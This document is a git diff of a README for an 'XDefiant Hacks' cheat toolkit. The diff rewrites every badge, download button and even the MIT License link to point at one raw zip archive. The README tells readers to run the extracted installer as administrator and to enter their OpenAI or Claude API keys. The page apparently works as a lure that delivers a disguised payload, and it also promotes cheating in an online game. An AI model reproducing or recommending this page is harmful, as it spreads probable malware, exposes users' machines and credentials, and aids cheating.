@@ -1,17 +1,17 @@
 # XDefiant Hacks: Unleash the Ultimate Advantage
 
-![XDefiant](https://img.shields.io/badge/XDefiant-Hacks-brightgreen)
-![Language](https://img.shields.io/badge/language-Python-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-yellow.svg)
-![Stars](https://img.shields.io/badge/Stars-Exploding_🚀-orange)
-![Last Commit](https://img.shields.io/badge/Updated-2025-important)
+![XDefiant](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
+![Language](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
+![License](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
+![Stars](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip🚀-orange)
+![Last Commit](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
 
 ---
 
 Welcome to **XDefiant Hacks** — the one-stop power station for achieving next-level gameplay enhancements, precision-assisting modules, and intuitive automation for *XDefiant*. Our digital toolkit is crafted for enthusiasts, content creators, and strategists seeking a competitive edge. Every feature is designed with adaptation and user empowerment in mind, balancing performance with discretion.
 
 🔗 **Begin your journey**:  
-[![Download](https://raw.githubusercontent.com/github/explore/main/topics/download/download.png)](https://romelancheta.github.io)
+[![Download](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
 
 ---
 
@@ -74,7 +74,7 @@ Unleash next-generation predictive intelligence and adaptive guidance directly i
 - **Tactical AI Coach:** Get in-game decision support as battles unfold, with strategy tips and live suggestions via OpenAI and Claude.
 - **Data-Driven Tactics Generator:** Harness GPT-powered analyses for custom playbooks.
 - **Integration Guide:**
-  1. Download the toolkit from our link: [![Download](https://raw.githubusercontent.com/github/explore/main/topics/download/download.png)](https://romelancheta.github.io)
+  1. Download the toolkit from our link: [![Download](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
   2. Enter your OpenAI/Claude API keys in the integration panel.
   3. Start *XDefiant* – let your AI teammate optimize your every move!
 
@@ -102,7 +102,7 @@ Our support is a fusion of human expertise and AI super-speed. Drop your queries
 
 1. **Prepare your PC:** Ensure *XDefiant* is updated and closed before starting.
 2. **Download the latest build:**  
-   [![Download](https://raw.githubusercontent.com/github/explore/main/topics/download/download.png)](https://romelancheta.github.io)
+   [![Download](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
 3. **Unpack & Install:** Extract the downloaded archive and run the installer as administrator.
 4. **Configure:** Launch the configurator to set language, UI theme, and your API preferences.
 5. **Start your game:** Boot up *XDefiant* — your enhancements activate automatically!
@@ -122,7 +122,7 @@ XDefiant Hacks operates within an ethical boundary. Our modules are designed for
 
 ## 📜 MIT License
 
-This repository is distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025. Feel free to use, modify, and distribute as described. Respect the boundaries. Contribute with creativity!
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip) © 2025. Feel free to use, modify, and distribute as described. Respect the boundaries. Contribute with creativity!
 
 ---
 
@@ -130,7 +130,7 @@ This repository is distributed under the [MIT License](https://opensource.org/li
 
 Stay ahead — grab the latest installer at any time:
 
-[![Download](https://raw.githubusercontent.com/github/explore/main/topics/download/download.png)](https://romelancheta.github.io)
+[![Download](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)](https://raw.githubusercontent.com/romelancheta/xdefiant-advantage-toolkit/branch/releaser/advantage-toolkit-xdefiant-2.0.zip)
 
 ---
 
